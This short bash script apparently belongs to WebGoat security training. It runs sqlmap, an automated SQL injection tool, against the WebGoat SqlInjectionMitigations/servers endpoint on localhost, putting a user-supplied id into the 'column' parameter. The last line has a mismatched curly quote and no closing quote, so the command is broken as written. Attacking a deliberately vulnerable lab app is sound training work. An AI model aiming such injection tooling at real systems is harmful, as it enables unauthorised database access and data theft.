#!/bin/bash

# Your execution path

EXECUTIONPATH="<executionpath>";

PORT="8080";
CONTROLLER="WebGoat";
ENDPOINT="SqlInjectionMitigations/servers";

# Get --id

ID=${1#--id=};

if [ -z $ID ];
then
	echo 'Id parameter must be provided. Try with --id=<value>';
	exit 1;
fi

# Parameterized get request

echo "Executing payload with id $ID";

$EXECUTIONPATH/sqlmap.py -u “http://localhost:$PORT/$CONTROLLER/$ENDPOINT?column=$ID;